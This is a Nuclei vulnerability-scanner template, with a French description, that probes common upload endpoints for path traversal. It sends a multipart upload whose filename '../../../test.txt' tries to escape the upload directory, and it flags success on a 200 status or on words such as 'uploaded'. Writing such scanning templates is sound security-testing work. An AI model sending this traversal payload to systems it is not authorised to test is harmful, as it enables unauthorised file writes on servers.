id: path-traversal-upload

info:
  name: Path Traversal in File Upload
  author: nuclei-templates
  severity: high
  description: Teste les vulnérabilités de path traversal dans les uploads de fichiers
  tags: path-traversal,file-upload,upload,security

http:
  - method: POST
    path:
      - "{{BaseURL}}/upload.php"
      - "{{BaseURL}}/upload.aspx"
      - "{{BaseURL}}/upload.jsp"
      - "{{BaseURL}}/file/upload"
      - "{{BaseURL}}/files/upload"
      - "{{BaseURL}}/filemanager/upload"

    headers:
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

    body: |
      ------WebKitFormBoundary
      Content-Disposition: form-data; name="file"; filename="../../../test.txt"
      Content-Type: text/plain

      test
      ------WebKitFormBoundary--

    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "uploaded"
          - "success"
        condition: or

